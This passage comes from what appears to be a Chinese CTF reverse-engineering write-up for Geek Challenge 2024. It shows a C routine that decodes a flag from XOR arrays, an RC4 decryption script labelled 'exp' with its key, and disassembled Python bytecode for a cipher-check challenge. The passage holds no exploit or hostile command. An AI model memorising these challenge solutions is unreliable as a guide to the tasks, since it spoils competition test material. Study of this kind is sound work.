class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8D</span>&#125;;<br>    <span class="hljs-type">int</span>  flag3[] = &#123;<span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>&#125;;<br>    <span class="hljs-type">int</span> flag4[]=&#123;<span class="hljs-number">0x65</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x2F</span>&#125;;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">46</span>,i;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        flag4[i] ^=  flag3[i+<span class="hljs-number">1</span>];  <br>        <br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        flag1[i]-=flag3[i];     <br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        flag2[i]^=flag4[<span class="hljs-number">51</span>];<br>        flag1[i]+=flag2[<span class="hljs-number">47</span>+i];<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        flag4[i] +=  flag2[i];  <br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>      flag1[i] ^=  flag2[i];  <br>        <br>    &#125;<br>    <span class="hljs-built_in">puts</span>(flag1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/0y4nWCBig3HdPZMW/1731740136954-22b04d8b-11cc-4e68-975f-388449ed438e-162227.png" alt="1731740136954-22b04d8b-11cc-4e68-975f-388449ed438e.png"></p><p><a href="https://am1re-sudo.github.io/Coisni.github.io/">https://am1re-sudo.github.io/Coisni.github.io/</a></p><p><img src="/./img/0y4nWCBig3HdPZMW/1731740295598-c781d21a-d0b5-44ca-bdd7-80939f47b3d8-543774.png" alt="1731740295598-c781d21a-d0b5-44ca-bdd7-80939f47b3d8.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1731740258994-d4352f1c-b446-4e32-b6ef-135bab2b8195-278730.png" alt="1731740258994-d4352f1c-b446-4e32-b6ef-135bab2b8195.png"></p><p><img src="/./img/0y4nWCBig3HdPZMW/1731740506704-52bcd9d9-a296-4db9-8ccf-a1cc4c8ecea7-125447.png" alt="1731740506704-52bcd9d9-a296-4db9-8ccf-a1cc4c8ecea7.png"></p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plain">from Crypto.Cipher import ARC4<br>import base64<br><br>def rc4_encrypt(data, key1):        # 加密<br>    key = bytes(key1, encoding=&#x27;utf-8&#x27;)<br>    enc = ARC4.new(key)<br>    res = enc.encrypt(data.encode(&#x27;utf-8&#x27;))<br>    res=base64.b64encode(res)<br>    res = str(res,&#x27;utf-8&#x27;)<br>    return res<br><br>def rc4_decrypt(data, key1):        # 解密<br>    data = base64.b64decode(data)<br>    key = bytes(key1, encoding=&#x27;utf-8&#x27;)<br>    enc = ARC4.new(key)<br>    res = enc.decrypt(data)<br>    res = str(res,&#x27;gbk&#x27;)<br>    return res<br><br><br>if __name__ == &quot;__main__&quot;:<br>    data = &#x27;Q7u+cyiOQtKHRMqZNzPpApgmTL4j+TE=&#x27;  # 需要解密的内容<br>    key = &#x27;lovebeforeBC&#x27;  # 加密key<br>    print(&#x27;解密后:&#x27;,rc4_decrypt(data, key))         # 解密方法<br></code></pre></td></tr></table></figure><h2 id="好像是python？-极客2024"><a href="#好像是python？-极客2024" class="headerlink" title="好像是python？-极客2024"></a>好像是python？-极客2024</h2><p>反汇编后得到字节码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br></pre></td><td class="code"><pre><code class="hljs plain">1           0 LOAD_CONST               0 (&#x27;SYC&#123;MD5(input)&#125;&#x27;)<br>              2 STORE_NAME               0 (flag)<br><br>  2           4 LOAD_NAME                1 (print)<br>              6 LOAD_CONST               1 (&#x27;Please input0:&#x27;)<br>              8 CALL_FUNCTION            1<br>             10 POP_TOP<br><br>  3          12 LOAD_CONST               2 (&#x27;&#x27;)<br>             14 STORE_NAME               2 (input0)<br><br>  6          16 LOAD_CONST               3 (&lt;code object test2 at 0x00000245D4F44B30, file &quot;program.py&quot;, line 6&gt;)<br>             18 LOAD_CONST               4 (&#x27;test2&#x27;)<br>             20 MAKE_FUNCTION            0<br>             22 STORE_NAME               3 (test2)<br><br> 14          24 LOAD_CONST               5 (&lt;code object test at 0x00000245D4F44BE0, file &quot;program.py&quot;, line 14&gt;)<br>             26 LOAD_CONST               6 (&#x27;test&#x27;)<br>             28 MAKE_FUNCTION            0<br>             30 STORE_NAME               4 (test)<br><br> 28          32 LOAD_CONST               7 (13)<br>             34 STORE_NAME               5 (a)<br><br> 29          36 LOAD_CONST               8 (14)<br>             38 STORE_NAME               6 (b)<br><br> 30          40 LOAD_NAME                5 (a)<br>             42 LOAD_NAME                6 (b)<br>             44 LOAD_NAME                5 (a)<br>             46 BINARY_ADD<br>             48 BINARY_XOR<br>             50 STORE_NAME               7 (c)<br><br> 31          52 LOAD_NAME                6 (b)<br>             54 LOAD_CONST               9 (100)<br>             56 BINARY_MULTIPLY<br>             58 STORE_NAME               8 (d)<br><br> 32          60 LOAD_NAME                5 (a)<br>             62 LOAD_NAME                6 (b)<br>             64 BINARY_XOR<br>             66 STORE_NAME               9 (e)<br><br> 33          68 LOAD_NAME                8 (d)<br>             70 LOAD_NAME                7 (c)<br>             72 LOAD_CONST              10 (4)<br>             74 BINARY_MULTIPLY<br>             76 BINARY_SUBTRACT<br>             78 LOAD_NAME                9 (e)<br>             80 BINARY_ADD<br>             82 LOAD_CONST              11 (1)<br>             84 BINARY_SUBTRACT<br>             86 STORE_NAME              10 (m)<br><br> 35          88 LOAD_NAME               10 (m)<br>             90 LOAD_CONST              12 (26)<br>             92 BINARY_MODULO<br>             94 STORE_NAME              11 (r)<br><br> 37          96 LOAD_NAME                4 (test)<br>             98 LOAD_NAME                2 (input0)<br>            100 LOAD_NAME               11 (r)<br>            102 CALL_FUNCTION            2<br>            104 STORE_NAME              12 (cipher1)<br><br> 38         106 LOAD_NAME                3 (test2)<br>            108 LOAD_NAME               12 (cipher1)<br>            110 CALL_FUNCTION            1<br>            112 STORE_NAME              13 (cipher2)<br><br> 39         114 LOAD_CONST              13 (-1)<br>            116 LOAD_CONST              14 (-36)<br>            118 LOAD_CONST              12 (26)<br>            120 LOAD_CONST              15 (-5)<br>            122 LOAD_CONST               8 (14)<br>            124 LOAD_CONST              16 (41)<br>            126 LOAD_CONST              17 (6)<br>            128 LOAD_CONST              18 (-9)<br>            130 LOAD_CONST              19 (60)<br>            132 LOAD_CONST              20 (29)<br>            134 LOAD_CONST              21 (-28)<br>            136 LOAD_CONST              22 (17)<br>            138 LOAD_CONST              23 (21)<br>            140 LOAD_CONST              24 (7)<br>            142 LOAD_CONST              25 (35)<br>            144 LOAD_CONST              26 (38)<br>            146 LOAD_CONST              12 (26)<br>            148 LOAD_CONST              27 (48)<br>            150 BUILD_LIST              18<br>            152 STORE_NAME              14 (num)<br><br> 40         154 LOAD_NAME               15 (range)<br>            156 LOAD_CONST              28 (18)<br>            158 CALL_FUNCTION            1<br>            160 GET_ITER<br>        &gt;&gt;  162 FOR_ITER                38 (to 202)<br>            164 STORE_NAME              16 (i)<br><br> 41         166 LOAD_NAME               13 (cipher2)<br>            168 LOAD_NAME               16 (i)<br>            170 BINARY_SUBSCR<br>            172 LOAD_NAME               14 (num)<br>            174 LOAD_NAME               16 (i)<br>            176 BINARY_SUBSCR<br>            178 COMPARE_OP               3 (!=)<br>            180 POP_JUMP_IF_FALSE      192<br><br> 42         182 LOAD_NAME                1 (print)<br>            184 LOAD_CONST              29 (&#x27;wrong!&#x27;)<br>            186 CALL_FUNCTION            1<br>            188 POP_TOP<br>            190 JUMP_ABSOLUTE          162<br><br> 44     &gt;&gt;  192 LOAD_NAME                1 (print)<br>            194 LOAD_CONST              30 (&#x27;Rrrright!&#x27;)<br>            196 CALL_FUNCTION            1<br>            198 POP_TOP<br>            200 JUMP_ABSOLUTE          162<br>        &gt;&gt;  202 LOAD_CONST              31 (None)<br>            204 RETURN_VALUE<br><br>Disassembly of &lt;code object test2 at 0x00000245D4F44B30, file &quot;program.py&quot;, line 6&gt;:<br>  7           0 LOAD_CONST               1 (&#x27;SYC&#x27;)<br>              2 STORE_FAST               1 (key)<br><br>  8           4 LOAD_CONST               2 (18)<br>              6 STORE_FAST               2 (length)<br><br>  9           8 BUILD_LIST               0<br>             10 STORE_FAST               3 (cipher)<br><br> 10          12 LOAD_GLOBAL              0 (range)<br>             14 LOAD_FAST                2 (length)<br>             16 CALL_FUNCTION            1<br>             18 GET_ITER<br>        &gt;&gt;   20 FOR_ITER                48 (to 70)<br>             22 STORE_FAST               4 (i)<br><br> 11          24 LOAD_FAST                3 (cipher)<br>             26 LOAD_METHOD              1 (append)<br>             28 LOAD_GLOBAL              2 (ord)<br>             30 LOAD_FAST                0 (s2)<br>             32 LOAD_FAST                4 (i)<br>             34 BINARY_SUBSCR<br>             36 CALL_FUNCTION            1<br>             38 LOAD_FAST                4 (i)<br>             40 BINARY_XOR<br>             42 LOAD_GLOBAL              2 (ord)<br>             44 LOAD_FAST                1 (key)<br>             46 LOAD_FAST                4 (i)<br>             48 LOAD_CONST               3 (3)<br>             50 BINARY_MODULO<br>             52 BINARY_SUBSCR<br>             54 CALL_FUNCTION            1<br>             56 UNARY_INVERT<br>             58 LOAD_CONST               4 (1)<br>             60 BINARY_ADD<br>             62 BINARY_ADD<br>             64 CALL_METHOD              1<br>             66 POP_TOP<br>             68 JUMP_ABSOLUTE           20<br><br> 12     &gt;&gt;   70 LOAD_FAST                3 (cipher)<br>             72 RETURN_VALUE<br><br>Disassembly of &lt;code object test at 0x00000245D4F44BE0, file &quot;program.py&quot;, line 14&gt;:<br> 15           0 BUILD_LIST               0<br>              2 STORE_FAST               2 (result)<br><br> 16           4 LOAD_FAST                0 (s)<br>              6 GET_ITER<br>        &gt;&gt;    8 FOR_ITER               218 (to 228)<br>             10 STORE_FAST               3 (i)<br><br> 17          12 LOAD_CONST               1 (&#x27;A&#x27;)<br>             14 LOAD_FAST                3 (i)<br>             16 DUP_TOP<br>             18 ROT_THREE<br>             20 COMPARE_OP               1 (&lt;=)<br>             22 POP_JUMP_IF_FALSE       32<br>             24 LOAD_CONST               2 (&#x27;Z&#x27;)<br>             26 COMPARE_OP               1 (&lt;=)<br>             28 POP_JUMP_IF_FALSE       80<br>             30 JUMP_FORWARD             4 (to 36)<br>        &gt;&gt;   32 POP_TOP<br>             34 JUMP_FORWARD            44 (to 80)<br><br> 18     &gt;&gt;   36 LOAD_FAST                2 (result)<br>             38 LOAD_METHOD              0 (append)<br>             40 LOAD_GLOBAL              1 (chr)<br>             42 LOAD_GLOBAL              2 (ord)<br>             44 LOAD_FAST                3 (i)<br>             46 CALL_FUNCTION            1<br>             48 LOAD_GLOBAL              2 (ord)<br>             50 LOAD_CONST               1 (&#x27;A&#x27;)<br>             52 CALL_FUNCTION            1<br>             54 BINARY_SUBTRACT<br>             56 LOAD_FAST                1 (R)<br>             58 BINARY_ADD<br>             60 LOAD_CONST               3 (26)<br>             62 BINARY_MODULO<br>             64 LOAD_GLOBAL              2 (ord)<br>             66 LOAD_CONST               1 (&#x27;A&#x27;)<br>             68 CALL_FUNCTION            1<br>             70 BINARY_ADD<br>             72 CALL_FUNCTION            1<br>             74 CALL_METHOD              1<br>             76 POP_TOP<br>             78 JUMP_ABSOLUTE            8<br><br> 19     &gt;&gt;   80 LOAD_CONST               4 (&#x27;a&#x27;)<br>             82 LOAD_FAST                3 (i)<br>             84 DUP_TOP<br>             86 ROT_THREE<br>             88 COMPARE_OP               1 (&lt;=)<br>             90 POP_JUMP_IF_FALSE      100<br>             92 LOAD_CONST               5 (&#x27;z&#x27;)<br>             94 COMPARE_OP               1 (&lt;=)<br>             96 POP_JUMP_IF_FALSE      148<br>             98 JUMP_FORWARD             4 (to 104)<br>        &gt;&gt;  100 POP_TOP<br>            102 JUMP_FORWARD            44 (to 148)<br><br> 20     &gt;&gt;  104 LOAD_FAST                2 (result)<br>            106 LOAD_METHOD              0 (append)<br>            108 LOAD_GLOBAL              1 (chr)<br>            110 LOAD_GLOBAL              2 (ord)<br>            112 LOAD_FAST                3 (i)<br>            114 CALL_FUNCTION            1<br>            116 LOAD_GLOBAL              2 (ord)<br>            118 LOAD_CONST               4 (&#x27;a&#x27;)<br>            120 CALL_FUNCTION            1<br>            122 BINARY_SUBTRACT<br>            124 LOAD_FAST                1 (R)<br>            126 BINARY_ADD<br>            128 LOAD_CONST               3 (26)<br>            130 BINARY_MODULO<br>            132 LOAD_GLOBAL              2 (ord)<br>            134 LOAD_CONST               4 (&#x27;a&#x27;)<br>            136 CALL_FUNCTION            1<br>            138 BINARY_ADD<br>            140 CALL_FUNCTION            1<br>            142 